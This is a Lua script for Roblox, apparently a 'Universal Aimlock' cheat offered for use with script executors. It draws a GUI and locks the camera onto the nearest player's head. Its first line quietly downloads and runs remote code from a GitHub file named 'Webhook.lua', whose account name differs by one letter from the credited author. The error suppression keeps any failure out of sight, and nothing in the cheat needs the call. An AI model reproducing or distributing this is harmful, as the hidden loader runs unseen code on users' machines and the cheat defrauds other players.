pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/StarFIow/Scripts/main/Utility/Webhook.lua"))()
end)

local UI = {};

UI["ScreenGui"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
UI["ScreenGui"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
UI["ScreenGui"]["ResetOnSpawn"] = false;

UI["Aimlock_UI"] = Instance.new("Frame", UI["ScreenGui"]);
UI["Aimlock_UI"]["BorderSizePixel"] = 0;
UI["Aimlock_UI"]["BackgroundColor3"] = Color3.fromRGB(36, 0, 61);
UI["Aimlock_UI"]["Size"] = UDim2.new(0, 214, 0, 154);
UI["Aimlock_UI"]["Position"] = UDim2.new(0.74089, 0, 0, 0);
UI["Aimlock_UI"]["Name"] = [[Aimlock_UI]];

UI["About"] = Instance.new("TextButton", UI["Aimlock_UI"]);
UI["About"]["TextWrapped"] = true;
UI["About"]["BorderSizePixel"] = 0;
UI["About"]["TextSize"] = 24;
UI["About"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["About"]["BackgroundColor3"] = Color3.fromRGB(91, 0, 161);
UI["About"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
UI["About"]["Size"] = UDim2.new(0, 206, 0, 38);
UI["About"]["Text"] = [[Creator Info]];
UI["About"]["Name"] = [[About]];
UI["About"]["Position"] = UDim2.new(0.01869, 0, 0.72727, 0);

UI["UICorner_1"] = Instance.new("UICorner", UI["About"]);

UI["UICorner_2"] = Instance.new("UICorner", UI["Aimlock_UI"]);

UI["Credits_UI"] = Instance.new("Frame", UI["Aimlock_UI"]);
UI["Credits_UI"]["BorderSizePixel"] = 0;
UI["Credits_UI"]["BackgroundColor3"] = Color3.fromRGB(36, 0, 61);
UI["Credits_UI"]["Size"] = UDim2.new(0, 210, 0, 118);
UI["Credits_UI"]["Position"] = UDim2.new(-1.00935, 0, 0, 0);
UI["Credits_UI"]["Name"] = [[Credits_UI]];
UI["Credits_UI"]["Visible"] = false;

UI["CreditsLabel"] = Instance.new("TextLabel", UI["Credits_UI"]);
UI["CreditsLabel"]["TextWrapped"] = true;
UI["CreditsLabel"]["BorderSizePixel"] = 0;
UI["CreditsLabel"]["TextSize"] = 14;
UI["CreditsLabel"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["CreditsLabel"]["TextScaled"] = true;
UI["CreditsLabel"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["CreditsLabel"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
UI["CreditsLabel"]["TextColor3"] = Color3.fromRGB(188, 121, 250);
UI["CreditsLabel"]["BackgroundTransparency"] = 1;
UI["CreditsLabel"]["Size"] = UDim2.new(0, 170, 0, 30);
UI["CreditsLabel"]["Text"] = [[Creator Info]];
UI["CreditsLabel"]["Name"] = [[CreditsLabel]];
UI["CreditsLabel"]["Position"] = UDim2.new(0.01905, 0, 0.01695, 0);

UI["UICorner_3"] = Instance.new("UICorner", UI["Credits_UI"]);

UI["CreditsText"] = Instance.new("TextLabel", UI["Credits_UI"]);
UI["CreditsText"]["TextWrapped"] = true;
UI["CreditsText"]["BorderSizePixel"] = 0;
UI["CreditsText"]["TextSize"] = 19;
UI["CreditsText"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["CreditsText"]["TextYAlignment"] = Enum.TextYAlignment.Top;
UI["CreditsText"]["BackgroundColor3"] = Color3.fromRGB(36, 0, 61);
UI["CreditsText"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
UI["CreditsText"]["TextColor3"] = Color3.fromRGB(252, 199, 253);
UI["CreditsText"]["BackgroundTransparency"] = 1;
UI["CreditsText"]["Size"] = UDim2.new(0, 200, 0, 80);
UI["CreditsText"]["Text"] = [[YouTube: @StarFlow.0\nDiscord: St4rFl0w\nScriptblox: @StarFlow]];
UI["CreditsText"]["Name"] = [[CreditsText]];
UI["CreditsText"]["Position"] = UDim2.new(0.02857, 0, 0.28814, 0);

UI["Hide_2"] = Instance.new("TextButton", UI["Credits_UI"]);
UI["Hide_2"]["TextWrapped"] = true;
UI["Hide_2"]["BorderSizePixel"] = 0;
UI["Hide_2"]["TextSize"] = 24;
UI["Hide_2"]["TextScaled"] = true;
UI["Hide_2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Hide_2"]["BackgroundColor3"] = Color3.fromRGB(91, 0, 161);
UI["Hide_2"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
UI["Hide_2"]["Size"] = UDim2.new(0, 30, 0, 30);
UI["Hide_2"]["Text"] = [[X]];
UI["Hide_2"]["Name"] = [[Hide_2]];
UI["Hide_2"]["Position"] = UDim2.new(0.84762, 0, 0.01695, 0);

UI["UICorner_4"] = Instance.new("UICorner", UI["Hide_2"]);

UI["Toggle"] = Instance.new("TextButton", UI["Aimlock_UI"]);
UI["Toggle"]["TextWrapped"] = true;
UI["Toggle"]["BorderSizePixel"] = 0;
UI["Toggle"]["TextSize"] = 24;
UI["Toggle"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Toggle"]["BackgroundColor3"] = Color3.fromRGB(91, 0, 161);
UI["Toggle"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
UI["Toggle"]["Size"] = UDim2.new(0, 206, 0, 38);
UI["Toggle"]["Text"] = [[Enable Aimlock]];
UI["Toggle"]["Name"] = [[Toggle]];
UI["Toggle"]["Position"] = UDim2.new(0.01869, 0, 0.22078, 0);

UI["UICorner_5"] = Instance.new("UICorner", UI["Toggle"]);

UI["Title"] = Instance.new("TextLabel", UI["Aimlock_UI"]);
UI["Title"]["TextWrapped"] = true;
UI["Title"]["BorderSizePixel"] = 0;
UI["Title"]["TextSize"] = 14;
UI["Title"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["Title"]["TextScaled"] = true;
UI["Title"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["Title"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
UI["Title"]["TextColor3"] = Color3.fromRGB(188, 121, 250);
UI["Title"]["BackgroundTransparency"] = 1;
UI["Title"]["Size"] = UDim2.new(0, 172, 0, 30);
UI["Title"]["Text"] = [[Universal Aimlock]];
UI["Title"]["Name"] = [[Title]];
UI["Title"]["Position"] = UDim2.new(0.01869, 0, 0.01299, 0);

UI["Target"] = Instance.new("TextLabel", UI["Aimlock_UI"]);
UI["Target"]["TextWrapped"] = true;
UI["Target"]["BorderSizePixel"] = 0;
UI["Target"]["TextSize"] = 19;
UI["Target"]["BackgroundColor3"] = Color3.fromRGB(36, 0, 61);
UI["Target"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
UI["Target"]["TextColor3"] = Color3.fromRGB(252, 199, 253);
UI["Target"]["BackgroundTransparency"] = 1;
UI["Target"]["Size"] = UDim2.new(0, 206, 0, 36);
UI["Target"]["Text"] = [[Target:]];
UI["Target"]["Name"] = [[Target]];
UI["Target"]["Position"] = UDim2.new(0.00935, 0, 0.48052, 0);

UI["Hide_1"] = Instance.new("TextButton", UI["Aimlock_UI"]);
UI["Hide_1"]["TextWrapped"] = true;
UI["Hide_1"]["BorderSizePixel"] = 0;
UI["Hide_1"]["TextSize"] = 24;
UI["Hide_1"]["TextScaled"] = true;
UI["Hide_1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Hide_1"]["BackgroundColor3"] = Color3.fromRGB(91, 0, 161);
UI["Hide_1"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
UI["Hide_1"]["Size"] = UDim2.new(0, 30, 0, 30);
UI["Hide_1"]["Text"] = [[-]];
UI["Hide_1"]["Name"] = [[Hide_1]];
UI["Hide_1"]["Position"] = UDim2.new(0.84112, 0, 0.01299, 0);

UI["UICorner_6"] = Instance.new("UICorner", UI["Hide_1"]);

UI["Show"] = Instance.new("TextButton", UI["ScreenGui"]);
UI["Show"]["TextWrapped"] = true;
UI["Show"]["BorderSizePixel"] = 0;
UI["Show"]["TextSize"] = 20;
UI["Show"]["TextColor3"] = Color3.fromRGB(188, 121, 250);
UI["Show"]["BackgroundColor3"] = Color3.fromRGB(36, 0, 61);
UI["Show"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
UI["Show"]["Size"] = UDim2.new(0, 118, 0, 44);
UI["Show"]["Text"] = [[Aimlock UI]];
UI["Show"]["Name"] = [[Show]];
UI["Show"]["Position"] = UDim2.new(0.4378, 0, -0.13015, 0);
UI["Show"]["Visible"] = false;

UI["UICorner_7"] = Instance.new("UICorner", UI["Show"]);
UI["UICorner_7"]["CornerRadius"] = UDim.new(0, 100);

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local function dragify(Frame)
    local dragToggle = nil
    local dragInput = nil
    local dragStart = nil
    local startPos = nil

    local function updateInput(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        TweenService:Create(Frame, TweenInfo.new(0.1), {Position = Position}):Play()
    end

    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if (input.UserInputState == Enum.UserInputState.End) then
                    dragToggle = false
                end
            end)
        end
    end)

    Frame.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if (input == dragInput and dragToggle) then
            updateInput(input)
        end
    end)
end

dragify(UI["Aimlock_UI"])
dragify(UI["Credits_UI"])

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local AimlockEnabled = false
local currentHighlight = nil
local currentTarget = nil
local connection = nil

function getClosestEnemy()
    local closestPlayer = nil
    local shortestDistance = math.huge
    local localCharacter = LocalPlayer.Character
    local localRoot = localCharacter and localCharacter:FindFirstChild("HumanoidRootPart")
    
    if not localRoot then return nil end
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local character = player.Character
            local humanoid = character:FindFirstChild("Humanoid")
            local head = character:FindFirstChild("Head")
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            
            if humanoid and humanoid.Health > 0 and rootPart and head then
                local distance = (localRoot.Position - rootPart.Position).Magnitude
                if distance < shortestDistance then
                    shortestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end
    
    return closestPlayer
end

function highlightEnemy(player)
    if currentHighlight then
        currentHighlight:Destroy()
        currentHighlight = nil
    end
    
    if not player or not player.Character then return end
    
    local highlight = Instance.new("Highlight")
    highlight.Name = "AimlockHighlight"
    highlight.Adornee = player.Character
    highlight.FillColor = Color3.fromRGB(255, 0, 0)
    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    highlight.FillTransparency = 0.3
    highlight.OutlineTransparency = 0
    highlight.Parent = player.Character
    
    currentHighlight = highlight
    currentTarget = player
end

function lockOnTarget()
    if not currentTarget or not currentTarget.Character then return end
    
    local head = currentTarget.Character:FindFirstChild("Head")
    if head then
        local camera = workspace.CurrentCamera
        local cameraPosition = camera.CFrame.Position
        local lookVector = (head.Position - cameraPosition).Unit
        camera.CFrame = CFrame.new(cameraPosition, cameraPosition + lookVector)
    end
end

function aimlockLoop()
    if not AimlockEnabled then return end
    
    local closestEnemy = getClosestEnemy()
    
    if closestEnemy then
        if currentTarget ~= closestEnemy then
            highlightEnemy(closestEnemy)
        end
        UI["Target"].Text = "Target: " .. closestEnemy.Name
        lockOnTarget()
    else
        if currentHighlight then
            currentHighlight:Destroy()
            currentHighlight = nil
        end
        UI["Target"].Text = "Target: None"
        currentTarget = nil
    end
end

function toggleAimlock()
    AimlockEnabled = not AimlockEnabled
    
    if AimlockEnabled then
        TweenService:Create(UI["Toggle"], TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(255, 0, 0)}):Play()
        UI["Toggle"].Text = "Disable Aimlock"
        if not connection then
            connection = RunService.RenderStepped:Connect(aimlockLoop)
        end
    else
        TweenService:Create(UI["Toggle"], TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
        UI["Toggle"].Text = "Enable Aimlock"
        if currentHighlight then
            currentHighlight:Destroy()
            currentHighlight = nil
        end
        UI["Target"].Text = "Target: None"
        currentTarget = nil
    end
end

UI["Hide_1"].MouseButton1Click:Connect(function()
    TweenService:Create(UI["Aimlock_UI"], TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 0, 0)}):Play()
    task.wait(0.3)
    UI["Aimlock_UI"].Visible = false
    UI["Aimlock_UI"].Size = UDim2.new(0, 214, 0, 154)
    UI["Show"].Visible = true
    TweenService:Create(UI["Show"], TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 118, 0, 44)}):Play()
end)

UI["Show"].MouseButton1Click:Connect(function()
    TweenService:Create(UI["Show"], TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 0, 0)}):Play()
    task.wait(0.3)
    UI["Show"].Visible = false
    UI["Show"].Size = UDim2.new(0, 118, 0, 44)
    UI["Aimlock_UI"].Visible = true
    UI["Aimlock_UI"].Size = UDim2.new(0, 0, 0, 0)
    TweenService:Create(UI["Aimlock_UI"], TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 214, 0, 154)}):Play()
end)

UI["About"].MouseButton1Click:Connect(function()
    UI["Credits_UI"].Visible = true
    UI["Credits_UI"].Size = UDim2.new(0, 0, 0, 0)
    TweenService:Create(UI["Credits_UI"], TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 210, 0, 118)}):Play()
end)

UI["Hide_2"].MouseButton1Click:Connect(function()
    TweenService:Create(UI["Credits_UI"], TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 0, 0)}):Play()
    task.wait(0.3)
    UI["Credits_UI"].Visible = false
    UI["Credits_UI"].Size = UDim2.new(0, 210, 0, 118)
end)

UI["Toggle"].MouseButton1Click:Connect(function()
    toggleAimlock()
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.RightControl then
        toggleAimlock()
    end
end)

return UI["ScreenGui"], require